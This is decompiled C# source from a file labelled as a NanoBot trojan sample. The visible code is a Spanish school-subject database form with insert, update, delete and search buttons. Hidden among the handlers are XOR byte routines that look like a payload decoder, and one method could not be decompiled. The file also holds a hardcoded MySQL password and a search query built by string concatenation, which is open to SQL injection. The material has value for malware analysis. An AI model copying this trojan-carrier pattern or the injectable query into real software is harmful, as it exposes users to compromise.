// Decompiled with JetBrains decompiler
// Type: Da7.m8P
// Assembly: Gj2, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: A62A5ADA-7FE4-4EB1-847A-643609D7485F
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.02-msil\HEUR-Trojan.MSIL.NanoBot.gen-0a3044af336b6c7268fe3d1f2fb8ecda2353552bee8455a6285be0a7e55e2d44.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using MySql.Data.MySqlClient;
using System;
using System.Collections;
using System.ComponentModel;
using System.Data;
using System.Data.Common;
using System.Diagnostics;
using System.Drawing;
using System.Runtime.CompilerServices;
using System.Windows.Forms;
using x5T;

namespace Da7
{
  [DesignerGenerated]
  public class m8P : Form
  {
    private IContainer components;
    public f7P Ma;
    private MySqlConnection conexion;
    private MySqlCommand comando;
    private MySqlDataAdapter da;
    private MySqlDataReader dr;
    private string strSQL;

    public m8P()
    {
      this.Load += new EventHandler(this.Lo84);
      this.Ma = new f7P();
      this.w9Y();
    }

    [DebuggerNonUserCode]
    protected virtual void Ea0(bool Em2)
    {
      try
      {
        if (!Em2 || this.components == null)
          return;
        this.components.Dispose();
      }
      finally
      {
        this.Dispose(Em2);
      }
    }

    [DebuggerStepThrough]
    private void w9Y()
    {
      this.LblNumMateria = new Label();
      this.TxtidMateria = new TextBox();
      this.LblNomMateria = new Label();
      this.TxtNombreMateria = new TextBox();
      this.BtnVerificarVacios = new Button();
      this.BtnInsertar = new Button();
      this.BtnActualizar = new Button();
      this.BtnEliminar = new Button();
      this.DgvMateria = new DataGridView();
      this.BtnConsultar = new Button();
      this.BtnConsultaGeneralMateria = new Button();
      this.Label1 = new Label();
      this.TxtBuscarMateria = new TextBox();
      ((ISupportInitialize) this.DgvMateria).BeginInit();
      this.SuspendLayout();
      this.LblNumMateria.AutoSize = true;
      this.LblNumMateria.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.LblNumMateria.Location = new Point(23, 43);
      this.LblNumMateria.Name = "LblNumMateria";
      this.LblNumMateria.Size = new Size(78, 19);
      this.LblNumMateria.TabIndex = 0;
      this.LblNumMateria.Text = "Id Materia: ";
      this.TxtidMateria.Location = new Point(168, 44);
      this.TxtidMateria.Name = "TxtidMateria";
      this.TxtidMateria.Size = new Size(160, 20);
      this.TxtidMateria.TabIndex = 1;
      this.LblNomMateria.AutoSize = true;
      this.LblNomMateria.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.LblNomMateria.Location = new Point(23, 79);
      this.LblNomMateria.Name = "LblNomMateria";
      this.LblNomMateria.Size = new Size(138, 19);
      this.LblNomMateria.TabIndex = 2;
      this.LblNomMateria.Text = "Nombre de la Materia:";
      this.TxtNombreMateria.Location = new Point(168, 78);
      this.TxtNombreMateria.Name = "TxtNombreMateria";
      this.TxtNombreMateria.Size = new Size(160, 20);
      this.TxtNombreMateria.TabIndex = 3;
      this.BtnVerificarVacios.BackColor = SystemColors.Highlight;
      this.BtnVerificarVacios.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.BtnVerificarVacios.Location = new Point(365, 44);
      this.BtnVerificarVacios.Name = "BtnVerificarVacios";
      this.BtnVerificarVacios.Size = new Size(122, 37);
      this.BtnVerificarVacios.TabIndex = 4;
      this.BtnVerificarVacios.Text = "Verificar";
      this.BtnVerificarVacios.UseVisualStyleBackColor = false;
      this.BtnInsertar.BackColor = SystemColors.Highlight;
      this.BtnInsertar.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.BtnInsertar.Location = new Point(27, 138);
      this.BtnInsertar.Name = "BtnInsertar";
      this.BtnInsertar.Size = new Size(114, 42);
      this.BtnInsertar.TabIndex = 5;
      this.BtnInsertar.Text = "Insertar";
      this.BtnInsertar.UseVisualStyleBackColor = false;
      this.BtnActualizar.BackColor = SystemColors.Highlight;
      this.BtnActualizar.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.BtnActualizar.Location = new Point(147, 138);
      this.BtnActualizar.Name = "BtnActualizar";
      this.BtnActualizar.Size = new Size(114, 42);
      this.BtnActualizar.TabIndex = 6;
      this.BtnActualizar.Text = "Actualizar";
      this.BtnActualizar.UseVisualStyleBackColor = false;
      this.BtnEliminar.BackColor = SystemColors.Highlight;
      this.BtnEliminar.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.BtnEliminar.Location = new Point(267, 138);
      this.BtnEliminar.Name = "BtnEliminar";
      this.BtnEliminar.Size = new Size(114, 42);
      this.BtnEliminar.TabIndex = 7;
      this.BtnEliminar.Text = "Eliminar";
      this.BtnEliminar.UseVisualStyleBackColor = false;
      this.DgvMateria.ColumnHeadersHeightSizeMode = DataGridViewColumnHeadersHeightSizeMode.AutoSize;
      this.DgvMateria.Location = new Point(27, 292);
      this.DgvMateria.Name = "DgvMateria";
      this.DgvMateria.Size = new Size(474, 187);
      this.DgvMateria.TabIndex = 8;
      this.BtnConsultar.BackColor = SystemColors.Highlight;
      this.BtnConsultar.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.BtnConsultar.Location = new Point(387, 138);
      this.BtnConsultar.Name = "BtnConsultar";
      this.BtnConsultar.Size = new Size(114, 42);
      this.BtnConsultar.TabIndex = 9;
      this.BtnConsultar.Text = "Consultar";
      this.BtnConsultar.UseVisualStyleBackColor = false;
      this.BtnConsultaGeneralMateria.BackColor = SystemColors.Highlight;
      this.BtnConsultaGeneralMateria.Font = new Font("AR CENA", 12f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.BtnConsultaGeneralMateria.Location = new Point(27, 186);
      this.BtnConsultaGeneralMateria.Name = "BtnConsultaGeneralMateria";
      this.BtnConsultaGeneralMateria.Size = new Size(474, 40);
      this.BtnConsultaGeneralMateria.TabIndex = 10;
      this.BtnConsultaGeneralMateria.Text = "Consulta General";
      this.BtnConsultaGeneralMateria.UseVisualStyleBackColor = false;
      this.Label1.AutoSize = true;
      this.Label1.Font = new Font("AR CENA", 14.25f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0);
      this.Label1.Location = new Point(38, 253);
      this.Label1.Name = "Label1";
      this.Label1.Size = new Size(114, 23);
      this.Label1.TabIndex = 11;
      this.Label1.Text = "Buscar Materia:";
      this.TxtBuscarMateria.Location = new Point(158, 257);
      this.TxtBuscarMateria.Name = "TxtBuscarMateria";
      this.TxtBuscarMateria.Size = new Size(190, 20);
      this.TxtBuscarMateria.TabIndex = 12;
      this.TxtBuscarMateria.Text = "Escriba la materia";
      this.AutoScaleDimensions = new SizeF(6f, 13f);
      this.AutoScaleMode = AutoScaleMode.Font;
      this.BackColor = SystemColors.Highlight;
      this.ClientSize = new Size(519, 505);
      this.Controls.Add((Control) this.TxtBuscarMateria);
      this.Controls.Add((Control) this.Label1);
      this.Controls.Add((Control) this.BtnConsultaGeneralMateria);
      this.Controls.Add((Control) this.BtnConsultar);
      this.Controls.Add((Control) this.DgvMateria);
      this.Controls.Add((Control) this.BtnEliminar);
      this.Controls.Add((Control) this.BtnActualizar);
      this.Controls.Add((Control) this.BtnInsertar);
      this.Controls.Add((Control) this.BtnVerificarVacios);
      this.Controls.Add((Control) this.TxtNombreMateria);
      this.Controls.Add((Control) this.LblNomMateria);
      this.Controls.Add((Control) this.TxtidMateria);
      this.Controls.Add((Control) this.LblNumMateria);
      this.Name = "FrmMateria";
      this.Text = "FrmMateria";
      ((ISupportInitialize) this.DgvMateria).EndInit();
      this.ResumeLayout(false);
      this.PerformLayout();
    }

    [field: AccessedThroughProperty("LblNumMateria")]
    internal virtual Label LblNumMateria { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TxtidMateria")]
    internal virtual TextBox TxtidMateria { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("LblNomMateria")]
    internal virtual Label LblNomMateria { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    [field: AccessedThroughProperty("TxtNombreMateria")]
    internal virtual TextBox TxtNombreMateria { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button BtnVerificarVacios
    {
      get => this._BtnVerificarVacios;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Yt95);
        Button btnVerificarVacios1 = this._BtnVerificarVacios;
        if (btnVerificarVacios1 != null)
          btnVerificarVacios1.Click -= eventHandler;
        this._BtnVerificarVacios = value;
        Button btnVerificarVacios2 = this._BtnVerificarVacios;
        if (btnVerificarVacios2 == null)
          return;
        btnVerificarVacios2.Click += eventHandler;
      }
    }

    internal virtual Button BtnInsertar
    {
      get => this._BtnInsertar;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Lo46);
        Button btnInsertar1 = this._BtnInsertar;
        if (btnInsertar1 != null)
          btnInsertar1.Click -= eventHandler;
        this._BtnInsertar = value;
        Button btnInsertar2 = this._BtnInsertar;
        if (btnInsertar2 == null)
          return;
        btnInsertar2.Click += eventHandler;
      }
    }

    internal virtual Button BtnActualizar
    {
      get => this._BtnActualizar;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Gg1x);
        Button btnActualizar1 = this._BtnActualizar;
        if (btnActualizar1 != null)
          btnActualizar1.Click -= eventHandler;
        this._BtnActualizar = value;
        Button btnActualizar2 = this._BtnActualizar;
        if (btnActualizar2 == null)
          return;
        btnActualizar2.Click += eventHandler;
      }
    }

    internal virtual Button BtnEliminar
    {
      get => this._BtnEliminar;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.a6DL);
        Button btnEliminar1 = this._BtnEliminar;
        if (btnEliminar1 != null)
          btnEliminar1.Click -= eventHandler;
        this._BtnEliminar = value;
        Button btnEliminar2 = this._BtnEliminar;
        if (btnEliminar2 == null)
          return;
        btnEliminar2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("DgvMateria")]
    internal virtual DataGridView DgvMateria { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual Button BtnConsultar
    {
      get => this._BtnConsultar;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Hq40);
        Button btnConsultar1 = this._BtnConsultar;
        if (btnConsultar1 != null)
          btnConsultar1.Click -= eventHandler;
        this._BtnConsultar = value;
        Button btnConsultar2 = this._BtnConsultar;
        if (btnConsultar2 == null)
          return;
        btnConsultar2.Click += eventHandler;
      }
    }

    internal virtual Button BtnConsultaGeneralMateria
    {
      get => this._BtnConsultaGeneralMateria;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.d4MW);
        Button consultaGeneralMateria1 = this._BtnConsultaGeneralMateria;
        if (consultaGeneralMateria1 != null)
          consultaGeneralMateria1.Click -= eventHandler;
        this._BtnConsultaGeneralMateria = value;
        Button consultaGeneralMateria2 = this._BtnConsultaGeneralMateria;
        if (consultaGeneralMateria2 == null)
          return;
        consultaGeneralMateria2.Click += eventHandler;
      }
    }

    [field: AccessedThroughProperty("Label1")]
    internal virtual Label Label1 { get; [MethodImpl(MethodImplOptions.Synchronized)] set; }

    internal virtual TextBox TxtBuscarMateria
    {
      get => this._TxtBuscarMateria;
      [MethodImpl(MethodImplOptions.Synchronized)] set
      {
        EventHandler eventHandler = new EventHandler(this.Cf4j);
        TextBox txtBuscarMateria1 = this._TxtBuscarMateria;
        if (txtBuscarMateria1 != null)
          txtBuscarMateria1.TextChanged -= eventHandler;
        this._TxtBuscarMateria = value;
        TextBox txtBuscarMateria2 = this._TxtBuscarMateria;
        if (txtBuscarMateria2 == null)
          return;
        txtBuscarMateria2.TextChanged += eventHandler;
      }
    }

    private void Yt95(object y6TB, EventArgs Py5s)
    {
      if (!this.b4D0() || !this.q6GJ())
        return;
      this.BtnInsertar.Enabled = true;
    }

    public bool b4D0()
    {
      try
      {
        foreach (Control control in this.Controls)
        {
          if (control is TextBox && Microsoft.VisualBasic.CompilerServices.Operators.CompareString(Strings.Trim(control.Text), "", false) == 0)
          {
            int num = (int) Interaction.MsgBox((object) "Debe de capturar este dato");
            control.Select();
          }
        }
      }
      finally
      {
        IEnumerator enumerator;
        if (enumerator is IDisposable)
          (enumerator as IDisposable).Dispose();
      }
      return true;
    }

    public bool q6GJ()
    {
      if (Versioned.IsNumeric((object) this.TxtidMateria.Text))
        return false;
      int num = (int) Interaction.MsgBox((object) "El id debe tener un valor numerico");
      return false;
    }

    private void Lo84(object o4R0, EventArgs Bb4n)
    {
    }

    private void Lo46(object i0D1, EventArgs Wb72)
    {
      try
      {
        this.conexion = new MySqlConnection("Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;");
        this.strSQL = "INSERT INTO materia (id_materia, nombre_m) VALUES (@id_materia, @nombre_m)";
        this.comando = new MySqlCommand(this.strSQL, this.conexion);
        this.comando.Parameters.AddWithValue("@id_materia", (object) this.TxtidMateria.Text);
        this.comando.Parameters.AddWithValue("@nombre_m", (object) this.TxtNombreMateria.Text);
        this.conexion.Open();
        this.comando.ExecuteNonQuery();
        this.Ma.IdMateria = Conversions.ToInteger(this.TxtidMateria.Text);
        this.Ma.nomMateria = this.TxtNombreMateria.Text;
        int num = (int) Interaction.MsgBox((object) ("Datos Enviados son Id: " + Conversions.ToString(this.Ma.IdMateria) + " Nombre de Materia: " + this.Ma.nomMateria));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.conexion.Close();
        this.conexion = (MySqlConnection) null;
        this.comando = (MySqlCommand) null;
      }
    }

    public static byte b4BS(byte r4QS, byte[] t2SC, int d8ZK, int Lr89)
    {
      r4QS = m8P.j3B6(r4QS, checked ((byte) ((int) t2SC[unchecked (Lr89 % t2SC.Length)] ^ Lr89 + unchecked (d8ZK % t2SC.Length) & d8ZK)));
      return r4QS;
    }

    private void Gg1x(object n4DW, EventArgs t9QR)
    {
      try
      {
        this.conexion = new MySqlConnection("Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;");
        this.strSQL = "UPDATE materia SET id_materia = @id_materia, nombre_m = @nombre_m WHERE id_materia = @id_materia";
        this.comando = new MySqlCommand(this.strSQL, this.conexion);
        this.comando.Parameters.AddWithValue("@id_materia", (object) this.TxtidMateria.Text);
        this.comando.Parameters.AddWithValue("@nombre_m", (object) this.TxtNombreMateria.Text);
        this.conexion.Open();
        this.comando.ExecuteNonQuery();
        this.Ma.IdMateria = Conversions.ToInteger(this.TxtidMateria.Text);
        this.Ma.nomMateria = this.TxtNombreMateria.Text;
        int num = (int) Interaction.MsgBox((object) ("Datos Actualizados son Id: " + Conversions.ToString(this.Ma.IdMateria) + " Nombre de Materia: " + this.Ma.nomMateria));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.conexion.Close();
        this.conexion = (MySqlConnection) null;
        this.comando = (MySqlCommand) null;
      }
    }

    private void a6DL(object Ye75, EventArgs Wy23)
    {
      try
      {
        this.conexion = new MySqlConnection("Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;");
        this.strSQL = "DELETE FROM materia WHERE id_materia = @id_materia";
        this.comando = new MySqlCommand(this.strSQL, this.conexion);
        this.comando.Parameters.AddWithValue("@id_materia", (object) this.TxtidMateria.Text);
        this.conexion.Open();
        this.comando.ExecuteNonQuery();
        this.Ma.IdMateria = Conversions.ToInteger(this.TxtidMateria.Text);
        int num = (int) Interaction.MsgBox((object) ("El Id_materia " + Conversions.ToString(this.Ma.IdMateria) + "Selimino Corretamente"));
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.conexion.Close();
        this.conexion = (MySqlConnection) null;
        this.comando = (MySqlCommand) null;
      }
    }

    private void Hq40(object w8LM, EventArgs Gm13)
    {
      try
      {
        this.conexion = new MySqlConnection("Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;");
        this.strSQL = "SELECT * FROM materia WHERE id_materia = @id_materia";
        this.comando = new MySqlCommand(this.strSQL, this.conexion);
        this.comando.Parameters.AddWithValue("@id_materia", (object) this.TxtidMateria.Text);
        this.conexion.Open();
        this.dr = this.comando.ExecuteReader();
        while (this.dr.Read())
        {
          this.TxtidMateria.Text = Conversions.ToString(this.dr["id_materia"]);
          this.TxtNombreMateria.Text = Conversions.ToString(this.dr["nombre_m"]);
        }
        int num = (int) Interaction.MsgBox((object) "Datos Consultados Correctamente");
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.conexion.Close();
        this.conexion = (MySqlConnection) null;
        this.comando = (MySqlCommand) null;
      }
    }

    private void d4MW(object Qq68, EventArgs g3R7)
    {
      try
      {
        this.conexion = new MySqlConnection("Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;");
        this.strSQL = "SELECT * FROM materia";
        DataTable dataTable = new DataTable();
        this.da = new MySqlDataAdapter(this.strSQL, this.conexion);
        ((DbDataAdapter) this.da).Fill(dataTable);
        this.DgvMateria.DataSource = (object) dataTable;
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        int num = (int) MessageBox.Show(ex.Message);
        ProjectData.ClearProjectError();
      }
      finally
      {
        this.conexion.Close();
        this.conexion = (MySqlConnection) null;
        this.comando = (MySqlCommand) null;
      }
    }

    internal static byte j3B6(byte Ed39, byte Zn05) => (byte) ((int) Ed39 ^ (int) Zn05);

    public DataTable Li36(string Go60)
    {
      this.conexion = new MySqlConnection("Server=localhost; Database=escuela; Uid=SistemaEscolar; Pwd=12345;");
      this.conexion.Open();
      DataTable dataTable = new DataTable();
      ((DbDataAdapter) new MySqlDataAdapter("SELECT * FROM materia WHERE nombre_m LIKE '%" + Go60 + "%'", this.conexion)).Fill(dataTable);
      this.conexion.Close();
      return dataTable;
    }

    private void Cf4j(object Dp3c, EventArgs Zi12)
    {
      if (this.Li36(this.TxtBuscarMateria.Text).Rows.Count <= 0)
        return;
      this.DgvMateria.DataSource = (object) this.Li36(this.TxtBuscarMateria.Text);
    }

    static void Zt4n()
    {
      // ISSUE: unable to decompile the method.
    }
  }
}
